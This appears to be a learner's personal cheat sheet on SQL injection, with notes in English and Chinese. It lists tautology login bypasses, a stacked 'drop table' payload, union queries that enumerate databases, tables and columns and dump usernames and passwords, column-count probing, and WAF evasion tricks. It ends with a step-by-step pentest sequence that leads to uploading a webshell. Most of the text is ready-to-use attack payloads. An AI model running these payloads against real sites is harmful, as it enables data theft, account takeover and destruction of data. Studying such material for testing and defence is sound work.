# SQLinjection  
SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
[Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)   
  
### Basic injection  
select password from users where name = '$id';  
So, what can we insert into $id?  
```  
5566 or 1=1 --  
5566; drop table hello  // execute drop table on second line  

rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
rafael' or ''='    // select password from users where name = 'rafael' or ''=''; 
```  
  
### Union based  
Try on terminal what will **SELECT name, password FROM users WHERE id = 1 UNION SELECT 1, 2** happen?  
Ans: The union result will show as second result with matching column of name and password!  
Therefore, if we just want the info we need, we can make the first clause not exist...  
```
select name, password from users where id = 1 and 1 = 0 union select 1, 2;  
```
```
// 秀出當前的庫名,使用者
select name, password from users where id = 1 and 1 = 0 union select database(), system_user();
```
```  
// 可以得到目前資料庫下的表名,欄位名  
... union select column_name, table_name from information_schema.columns where table_schema=database(); 
```
```
// 也可以得到其他資料庫的名字!  
... union select table_schema, table_name from information_schema.columns;  
// 我的 k朋友說: 尋找 資料庫就應該用schemata, 回傳才不會重複而且有效率
... union select group_concat(schema_name) from information_schema.schemata;  // group_concat會將結果合併成一行,我們甚至不需要limit
```
```
// 可以得到所有table和column的名字 
... union select table_name, column_name from information_schema.columns;
```
```
// 回傳的結果太多 , 我們可以用 limit加以限制
// 網頁常常只能show唯一的結果
... union select table_name, column_name from information_schema.columns limit 1, 1;  
```  
```  
// 在做union select時如何知道columns的數量  
? id =' or 1=1 order by N--+    // N一筆一筆增加直到頁面無法正確顯示, --+註解掉後面的條件, +是代表註解後面要有空白!
```
[What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
**group_concat() is also a litte trick.**

### Blind based   
When we cannot show results what we want, we still can find whether it exists or not.  
**True**: Web page shows normal.  
**False**: Web page shows error or blank.  
```  
... exists (select * from table);  // 配合 AND使用
```

### Time based  
Wait for my first time practice ><...
  
### Error based  
Show the result in error message!  
Wait for my first time practice ><... 
  
### WAF bypass
WAF is a defender for web.  
繞過手勢:  
- No 'space'  
  - ```select/**/username/**/from/**/users;```
  - ```union select 1,2``` -> ```union(select(1),2)```
- No 'select'...  
  - ```大小寫混淆 e.g. SelecT``` 
- No comma ','  
  - ```union select 1,2,3``` -> ```union select * from ((select 1)a join (select 2)b join (select 3)c);```   
- Encode your payload  
  - ```URL-ENCODE, HEXIDECIMAL, UNICODE```
  
### Webshell  
Based on the provilege of db user, we can upload shell to read or write to db.  
  
### Trick of Pentesting  
Here are some tricks of pentesting, step by step from find the vulnerability to exploit it!  
1. SQL vulnerability? injection point?  
```
1' or 1=1--+  
1' and 1=2--+  // sql error message or page show error?
```
這裡, 我們要判斷出sql漏洞的存在與否  

2. Number of columns   
```
1' order by N--+   // 不斷增加N的數量, 直到頁面顯示錯誤
```
這裡我們就可以確認query的字段數, union select用起來也比較方便  

3. Where are the SNAKES we want?  
```
1' and 1=2 union select 1,2,...N--+   // 加以確認我們注入的東西會出現在哪裡
```  

4. First, we need to know some basic information...   
```
...union select user(),database(),version(), @@version_compile_os--+  // 後面兩個分別是資料庫版本以及作業系統版本
```  

5. Start the exciting part...  
```
...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
```  
```
...union select 1,2,...,group_concat(table_name) from information_schema.tables where schema_name='FUCK'+--+  
// FUCK那邊也可以用hex表示
```
```
...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
```
```
// 最終目的
1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
```  
6. After get username and password to login, we can write a webshell to upload!
